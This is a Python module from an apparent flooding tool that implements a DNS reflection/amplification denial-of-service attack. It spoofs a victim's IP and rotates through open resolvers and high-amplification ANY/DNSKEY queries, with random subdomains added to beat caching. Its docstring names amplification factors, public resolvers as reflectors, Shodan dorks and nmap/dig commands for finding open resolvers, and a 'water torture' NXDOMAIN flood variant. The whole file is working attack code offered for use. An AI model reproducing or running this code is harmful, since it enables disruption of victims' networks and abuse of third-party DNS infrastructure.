"""
modules/dns_amp.py - DNS Amplification (DRDoS)
DNS reflection/amplification attack.

Amplification factors by query type:
  ANY    : 28-54x  (deprecated by RFC 8482, but many servers still respond)
  DNSKEY : 30-100x (DNSSEC public key, large response)
  TXT    : 5-20x
  A      : ~3x     (minimal, not useful for amp)

Best targets for open resolvers:
  8.8.8.8    (Google, rate-limited but test-worthy)
  1.1.1.1    (Cloudflare, rate-limited)
  Custom: find open resolvers via Shodan: port:53 "recursion: enabled"

How to find vulnerable resolvers:
  nmap -sU -p 53 --script=dns-recursion <target>
  dig @<resolver> isc.org ANY  # Check if it responds to ANY queries

Attack flow:
  1. Attacker sends DNS query to open resolver (src=victim_ip)
  2. Resolver sends large response to victim_ip
  3. Victim receives amplified traffic it never requested

DNSSEC amplification (highest factor):
  Query: 50 bytes  (DNSKEY request for signed zone)
  Response: 3000+ bytes (DNSKEY records + RRSIG)
  Factor: ~60x

Water torture variant (NXDOMAIN flood):
  Random subdomains of a legit domain:
    {rand}.victim-authoritative-domain.com
  Forces resolver to query authoritative server for each (cache miss)
  -> Exhausts authoritative DNS server AND resolver cache
"""

import itertools
import random
import string
from floodles.core.packet_builder import PacketBuilder
from floodles.core.sender import FloodEngine


# Queries that elicit large responses from open resolvers
HIGH_AMP_QUERIES = [
    ("isc.org",            "ANY"),
    ("cloudflare.com",     "ANY"),
    ("google.com",         "DNSKEY"),
    ("akamai.com",         "ANY"),
    ("verisign.com",       "DNSKEY"),
    ("ripe.net",           "ANY"),
]


def run(
    victim_ip: str,
    reflectors: list[str],
    query: str = "isc.org",
    qtype: str = "ANY",
    threads: int = 8,
    pps_limit: int = 0,
    duration: int = 30,
    rotate_queries: bool = True,
    rand_sub: bool = True,
) -> FloodEngine:
    """
    Launch DNS amplification attack.

    Args:
        victim_ip      : Target IP (spoofed source).
        reflectors     : List of open DNS resolver IPs.
        query          : DNS name to query (high-response zones preferred).
        qtype          : Query type: ANY, DNSKEY, TXT, A.
        threads        : Worker count.
        pps_limit      : PPS cap.
        duration       : Duration in seconds.
        rotate_queries : Cycle through HIGH_AMP_QUERIES for max diversity.
        rand_sub       : Prepend random 8-char label per packet to bypass resolver cache.

    Returns:
        FloodEngine (already started).

    Finding reflectors (Shodan dorks):
        port:53 "recursion: enabled"
        port:53 country:XX "recursion: enabled"
    """
    builder = PacketBuilder()
    reflector_cycle = itertools.cycle(reflectors)
    query_cycle = itertools.cycle(HIGH_AMP_QUERIES) if rotate_queries else None

    def make_packet() -> bytes:
        reflector = next(reflector_cycle)
        if rotate_queries and query_cycle:
            q, qt = next(query_cycle)
        else:
            q, qt = query, qtype
        if rand_sub:
            label = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
            q = f"{label}.{q}"
        return builder.dns_amp(
            reflector_ip=reflector,
            victim_ip=victim_ip,
            query=q,
            qtype=qt,
        )

    engine = FloodEngine(
        packet_fn=make_packet,
        dst_ip=reflectors[0],
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
    )
    engine.start()
    return engine
